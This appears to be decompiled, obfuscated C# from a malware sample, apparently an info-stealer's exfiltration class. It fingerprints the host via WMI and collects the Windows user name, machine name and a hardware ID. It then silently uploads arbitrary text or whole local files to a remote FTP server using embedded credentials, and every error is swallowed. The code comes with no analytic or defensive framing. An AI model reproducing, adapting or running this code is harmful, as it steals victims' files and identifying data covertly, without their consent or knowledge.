using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class yWTIBbUKdpiy
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string RuDYtoNcCxI()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107402203));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107402182)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107402197);
			ManagementObject val3 = new ManagementObject(getString_0(107402192) + text2 + getString_0(107401607));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107401602)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389281) : text;
		}
	}

	public static void gmIyowWwkfSR(string GdSqezTpHHWqI = "URL", string xRpGJwCWPBX = "USERNAME", string CFfTnLBdettRX = "ACCESO", string jPHMCKMEFxqvVP = "")
	{
		try
		{
			string text = RuDYtoNcCxI();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(GdSqezTpHHWqI + getString_0(107402936) + Environment.UserName + getString_0(107402923) + Environment.MachineName + getString_0(107403414) + text + getString_0(107403409));
			ftpWebRequest.Method = getString_0(107401577);
			ftpWebRequest.Credentials = new NetworkCredential(xRpGJwCWPBX, CFfTnLBdettRX);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(jPHMCKMEFxqvVP);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void ybntlhJHhisLb(string JxUQEfNGNYyAACj = "URL", string HzMtcWJTtxxpp = "USERNAME", string gImcvsvcXxT = "ACCESO", string KCRXtaTAATTIqO = "")
	{
		try
		{
			string text = RuDYtoNcCxI();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(JxUQEfNGNYyAACj + getString_0(107402936) + Environment.UserName + getString_0(107402923) + Environment.MachineName + getString_0(107403414) + text + getString_0(107403414) + Path.GetFileName(KCRXtaTAATTIqO));
			ftpWebRequest.Method = getString_0(107401577);
			ftpWebRequest.Credentials = new NetworkCredential(HzMtcWJTtxxpp, gImcvsvcXxT);
			byte[] array = File.ReadAllBytes(KCRXtaTAATTIqO);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static yWTIBbUKdpiy()
	{
		Strings.CreateGetStringDelegate(typeof(yWTIBbUKdpiy));
	}
}
